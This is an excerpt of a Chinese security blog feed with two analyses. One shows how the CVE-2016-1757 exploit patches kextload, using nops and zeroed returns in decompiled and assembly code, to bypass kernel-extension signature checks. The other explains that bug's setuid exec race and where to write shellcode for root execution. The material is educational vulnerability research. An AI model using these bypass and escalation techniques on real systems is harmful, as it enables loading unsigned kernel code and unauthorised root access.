<p>这样一段话说的已经很清楚了，关于在<code>OS X</code>系统中沙盒的简单应用，也有文章解释过了，这些不是本文的核心内容，有兴趣的读者可以自行<code>google</code>。</p>
<p>在<code>OS X</code>以及<code>IOS</code>系统中限制了进程对一些资源的访问权限，例如网络、某些特殊路径、文件的读写等等，限定了进程的一些行为，从而保证进程不会做出超越权限的操作。</p>]]>
    
    </summary>
    
      <category term="sandbox" scheme="http://turingh.github.io/tags/sandbox/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[利用patch绕过kextload对内核签名的检测]]></title>
    <link href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
    <id>http://turingh.github.io/2016/04/13/利用patch绕过kextload对内核签名的检测/</id>
    <published>2016-04-13T17:21:22.000Z</published>
    <updated>2016-04-19T18:44:37.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>
<a id="more"></a>
<h1 id="0x01_数字签名与内核扩展">0x01 数字签名与内核扩展</h1><p>​    <code>OSX</code>系统在加载内核扩展时要求必须拥有苹果的开发者签名。在开发过程中，在自己的调试环境中可以通过修改参数加载没有签名的驱动，进行开发与调试。</p>
<h2 id="1-1_OS_X_10-11之后版本">1.1 OS X 10.11之后版本</h2><p>​    在OS X 10.11中引入的Rootless机制之后只需要关闭Rootless机制就可以加载没有签名的驱动扩展。细节可以参考这一篇文章。<a href="http://tadaland.com/os-x-rootless.html" target="_blank" rel="external">OS X 10.11中Rootless的实现与解释以及关闭方法</a></p>
<h2 id="1-2_OS_X_10-11之前版本">1.2 OS X 10.11之前版本</h2><p>​    在OS X 10.11之前的版本需要修改内核启动参数，并重启系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args=<span class="string">"kext-dev-mode=1"</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<h1 id="0x02_Patch详细分析">0x02 Patch详细分析</h1><p>​    通过对<code>kextload</code>程序patch前后的对比可以发现，总共对两个函数进行了patch。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/ida_diff.png" alt="ida_bindiff"></p>
<h2 id="2-1_sub_100020c9(check_root)">2.1 sub_100020c9(check_root)</h2><p>​    通过<code>bindiff</code>发现，<code>sub_100020c9</code>函数改变非常的大（rename成了check_root，不一定完全正确），patch前后对比如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindff_check_root.png" alt="check_root"></p>
<p>该函数内容被完全替换，直接返回0。</p>
<p>通过ida看一下替换前该函数的伪代码，可以大致了解该函数的作用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp-4h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  HIDWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( bootstrap_look_up(*(_DWORD *)bootstrap_port_ptr, <span class="string">"com.apple.KernelExtensionServer"</span>, (<span class="keyword">mach_port_t</span> *)&amp;v3 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( geteuid() )</span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">113L</span>L, <span class="string">"Can't contact kextd; must run as root to load kexts."</span>);</span><br><span class="line">      v1 = <span class="number">77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">115L</span>L, <span class="string">"Can't contact kextd; attempting to load directly into kernel."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_100004808 = <span class="number">1</span>;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(v3) )</span><br><span class="line">    mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, HIDWORD(v3));</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到返回0的情况有两种：</p>
<ul>
<li>能够获取到与<code>com.apple.KernelExtensionServer</code>通信的<code>port</code>。</li>
<li>没有获取到<code>port</code>，但是拥有<code>root</code>权限。</li>
</ul>
<p>逻辑比较简单，应该就是为后面的内核扩展加载检测一下权限和资源。<code>patch</code>后直接返回0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_sub_1000023bc">2.2 sub_1000023bc</h2><p>​    该函数相似度有99%，查看<code>patch</code>后的前后对比的具体细节，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindiff_check_sign.png" alt="bindiff_check_sign"></p>
<p>通过<code>nop</code>指令，干掉了对<code>sub_100000979</code>函数的调用。直接通过<code>xor</code>指令清零<code>eax</code>。</p>
<p>查看<code>sub_100000979</code>的伪代码，看看该函数究竟做了些什么。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_sign</span><span class="params">(__int64 a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r13@1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// r15@1</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@1</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@5</span></span><br><span class="line">  __CFString *v11; <span class="comment">// rdi@5</span></span><br><span class="line">  __int64 v12; <span class="comment">// rsi@10</span></span><br><span class="line">  __int64 v14; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  __int64 v15; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a2;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = -<span class="number">67061</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v7) = OSKextGetURL();</span><br><span class="line">    LODWORD(v8) = CFURLCopyAbsoluteURL(v7);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SecStaticCodeCreateWithPath(v8, <span class="number">0L</span>L, &amp;v15) || !v15 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      LODWORD(v10) = OSKextGetIdentifier(a1);</span><br><span class="line">      v11 = &amp;cfstr_AnchorApple;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)CFStringHasPrefix(v10, &amp;cfstr_Com_apple_) )</span><br><span class="line">        v11 = &amp;cfstr_AnchorAppleGen;</span><br><span class="line">      <span class="keyword">if</span> ( SecRequirementCreateWithString(v11, <span class="number">0L</span>L, &amp;v14) || !v14 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">        OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">        v6 = -<span class="number">67061</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          v12 = <span class="number">536870913L</span>L;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v12 = <span class="number">1073741825L</span>L;</span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        <span class="comment">//签名检测</span></span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        v6 = SecStaticCodeCheckValidity(v15, v12);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp;&amp; v6 &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_100000B19(v5, v9, <span class="number">1L</span>L) )</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      CFRelease(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        CFRelease(v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">      v6 = -<span class="number">67061</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      CFRelease(v14);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最核心的就是调用了<code>SecStaticCodeCheckValidity</code>这个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	Performs static validation on the given SecStaticCode object. The call obtains and</span><br><span class="line">	verifies the signature on the code object. It checks the validity of all</span><br><span class="line">	sealed components (including resources, if any). It validates the code against</span><br><span class="line">	a SecRequirement if one is given. The call succeeds if all these conditions</span><br><span class="line">	are satisfactory. It fails otherwise.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*蹩脚的翻译一下</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	认证传入的SecStaticCode对象的合法性，该函数调用获取并检测数字签名的合法性。</span><br><span class="line">	认证内容包含了所有的组件(如果存在资源文件同样会检测)。</span><br><span class="line">	如果提供了加密的内容，也会对加密部分进行认证。</span><br><span class="line">	当所有条件满足时函数调用返回成功。</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>这是该函数在头文件中的定义。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>​    经过测试确实可以绕过数字签名的检测成功加载了未签名的内核扩展。</p>
<p>​    通过对<code>kextload</code>的<code>patch</code>，绕过两个检测函数，从而达到了绕过<code>OSX</code>系统对驱动扩展的签名检测，结合<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>root</code>权限执行任意代码，从而实现了，普通用户可以加载任意未签名的内核扩展。</p>
<h1 id="0x04_勘误">0x04 勘误</h1><p>​    由于不够严谨，遗漏了一个patch的点，这里补上。更详细的原理在<code>exploit</code>的分析文章中可以看到。</p>
<h2 id="4-1_sub_1000023BC">4.1 sub_1000023BC</h2><p>在<code>sub_1000023BC</code>函数中的对sub_085c的调用被patch修改绕过签名验证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">0000000100002802</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">0000000100002807</span>                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">000000010000280</span>A                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">000000010000280</span>D                 call    sub_10000085C</span><br><span class="line">__text:<span class="number">0000000100002812</span>                 test    eax, eax</span><br><span class="line">__text:<span class="number">0000000100002814</span>                 mov     r12, r14</span><br><span class="line">__text:<span class="number">0000000100002817</span>                 mov     r14, [rbp+var_CD0]</span><br><span class="line">__text:<span class="number">000000010000281</span>E                 jnz     loc_1000028FA</span><br></pre></td></tr></table></figure>
<p>patch后代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">000000010000277</span>E                 mov     r14, r12</span><br><span class="line">__text:<span class="number">0000000100002781</span>                 movzx   r12d, [rbp+var_CB9]</span><br><span class="line">__text:<span class="number">0000000100002789</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">000000010000278</span>E                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">0000000100002791</span>                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">0000000100002794</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002795</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002796</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002797</span>                 xor     eax, eax</span><br><span class="line">__text:<span class="number">0000000100002799</span>                 mov     ebx, eax</span><br><span class="line">__text:<span class="number">000000010000279</span>B                 test    ebx, ebx</span><br></pre></td></tr></table></figure>
<p><code>bindiif</code>如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/kanwu1.png" alt="勘误1"></p>
<h1 id="ps:">ps:</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>]]>
    
    </summary>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="kextload" scheme="http://turingh.github.io/tags/kextload/"/>
    
      <category term="patch" scheme="http://turingh.github.io/tags/patch/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757简单分析]]></title>
    <link href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/03/CVE-2016-1757简单分析/</id>
    <published>2016-04-03T17:49:24.000Z</published>
    <updated>2016-04-29T19:07:36.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>灵犀一指可攻可守，进攻时也是一指，是天下第一指法，与移花接玉这个天下第一掌法同样都是非兵刃的第一绝技</p>
<p>—陆小凤传奇</p>
</blockquote>
<p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>
<a id="more"></a>
<h1 id="0x01_基础知识">0x01 基础知识</h1><h2 id="1-1_exec函数流程">1.1 exec函数流程</h2><p>我在<a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSX内核加载mach-o流程分析</a>中比较详细的分析了<code>exec</code>整个执行流程中比较重要的几个函数，这个是比较精简的一个流程图。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="exec函数图"></p>
<h1 id="1-2_mach_vm_*_API">1.2 mach_vm_* API</h1><p><code>Mach</code>提供了一种用户层对虚拟内存的操作方式。一系列对<code>vm_map_t</code>作出操作的<code>API</code>可以对虚拟内存作出很多操作。这里的<code>vm_map_t</code>就是<code>PORT</code>。</p>
<p>这一系列的API有很多，这里只是简单的介绍一下POC中会使用到的API。</p>
<h3 id="1-2-1_mach_vm_allocate">1.2.1 mach_vm_allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mach_vm_allocate(<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,<span class="keyword">mach_vm_address_t</span> *address,<span class="keyword">mach_vm_size_t</span> size,<span class="keyword">int</span> flags);</span><br></pre></td></tr></table></figure>
<p>在<code>map</code>中分配<code>size</code>个字节大小的内存，根据<code>flags</code>的不同会有不同的处理方式。<code>address</code>是一个<code>I/O</code>的参数（例如：获取分配后的内存大小）。</p>
<p>如果<code>flags</code>的值不是<code>VM_FLAGS_ANYWHERE</code>，那么内存将被分配到<code>address</code>指向的地址。                                                            </p>
<h3 id="1-2-2_mach_vm_region">1.2.2 mach_vm_region</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_region(</span><br><span class="line">	<span class="keyword">vm_map_t</span>		 <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	*address,		<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_vm_size_t</span>	*size,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">vm_region_flavor_t</span>	 flavor,		<span class="comment">/* IN */</span></span><br><span class="line">	<span class="keyword">vm_region_info_t</span>	 info,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">mach_msg_type_number_t</span>	*count,			<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_port_t</span>		*object_name)		<span class="comment">/* OUT */</span></span><br></pre></td></tr></table></figure>
<p>获取<code>map</code>指向的任务内，<code>address</code>地址起始的VM region（虚拟内存区域）的信息。目前标记为<code>flavor</code>只有<code>VM_BASIC_INFO_64</code>。            </p>
<p>获得的info的数据结构如下。                                                </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm_region_basic_info_64 &#123;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		protection;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		max_protection;</span><br><span class="line">	<span class="keyword">vm_inherit_t</span>		inheritance;</span><br><span class="line">	<span class="keyword">boolean_t</span>		shared;</span><br><span class="line">	<span class="keyword">boolean_t</span>		reserved;</span><br><span class="line">	<span class="keyword">memory_object_offset_t</span>	offset;</span><br><span class="line">	<span class="keyword">vm_behavior_t</span>		behavior;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		user_wired_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-3_mach_vm_protect">1.2.3 mach_vm_protect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_protect(</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> task,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> address,</span><br><span class="line">	<span class="keyword">mach_vm_size_t</span> size,</span><br><span class="line">	<span class="keyword">boolean_t</span> set_maximum,</span><br><span class="line">	<span class="keyword">vm_prot_t</span> new_protection)</span><br></pre></td></tr></table></figure>
<p>对<code>address</code>到<code>address+size</code>这一段的内存设置内存保护策略,<code>new_protection</code>就是最后设置成为的保护机制。</p>
<h3 id="1-2-4_mach_vm_write">1.2.4 mach_vm_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_write(</span><br><span class="line">	<span class="keyword">vm_map_t</span>			<span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span>		address,</span><br><span class="line">	<span class="keyword">pointer_t</span>			data,</span><br><span class="line">	__unused <span class="keyword">mach_msg_type_number_t</span>	size)</span><br></pre></td></tr></table></figure>
<p>对<code>address</code>指向的内存改写内容。</p>
<h1 id="1-3_Ports">1.3 Ports</h1><p><code>Ports</code>是一种<code>Mach</code>提供的<code>task</code>之间相互交互的机制，通过<code>Ports</code>可以完成类似进程间通信的行为。每个<code>Ports</code>都会有自己的权限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND		((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) <span class="number">6</span>)</span></span><br></pre></td></tr></table></figure>
<p><code>Ports</code>可以在不同的<code>task</code>之间传递，通过传递可以赋予其他<code>task</code>对<code>ports</code>的操作权限。例如POC中使用的就是在父进程与子进程之间传递<code>Port</code>得到了对内存操作的权限。</p>
<h1 id="0x02_漏洞原理">0x02 漏洞原理</h1><p>​    在内核处理setuid的程序时存在一个时间窗口，通过这个时间窗口，在进程<code>Port</code>被关闭之前，拥有进程<code>Port</code>的程序可以改写目标进程的任意内存，通过改写内存可以利用目标进程的root权限执行任意的shellcode。</p>
<h2 id="2-1_execv流程漏洞">2.1 execv流程漏洞</h2><p><img src="https://2.bp.blogspot.com/-lw-AyicBVT0/VvGCDuX_AZI/AAAAAAAABRk/sjk9rPkkGhMsrNI6ZkVxNexTffskLBs0Q/s1600/2016-03-22_2.png" alt="流程图"><br><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-4_load_machfile">load_machfile源码分析</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-3_exec_mach_imgact">exec_mach_imgact源码分析</a></p>
<p>在swap_task_map以及exec_handle_suid之间有一个时间窗口，task port还是可以对内存做出修改的。</p>
<p>具体细节可以参考poc，同时也可以参考源码的分析日志。</p>
<h3 id="2-2_捕获时间窗口(灵犀一指)">2.2 捕获时间窗口(灵犀一指)</h3><p>​    时间窗口打开的时机对编写poc非常重要，因为在调用exec之后整个行为都是内核控制的，没有什么直接的办法获取时间窗口，poc中提供的方法是通过不断的调用<code>mach_vm_region</code>，当窗口出现时，也就是从old_map切换到new_map时，<code>mach_vm_region</code>函数获取的address应该是不同的。具体实现在下面的poc源码分析中会提到。</p>
<h3 id="2-3_任意内存写">2.3 任意内存写</h3><p>​    在得到窗口打开的时机之后通过上面提到的port以及mach_vm_*的一系列函数就可以做到对目标进程的任意写操作，从而写入shellcode。</p>
<h3 id="2-4_shellcode的执行(移花接木)">2.4 shellcode的执行(移花接木)</h3><p>​    shellcode要写在什么地方才会被执行呢？    </p>
<p>​    通过对traceroute6的分析，可以看到__text的地址偏移是0x153c，所以通过对该地址的内存改写，可以使得shellcode得到执行。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/shellcode.png" alt="traceroute6"></p>
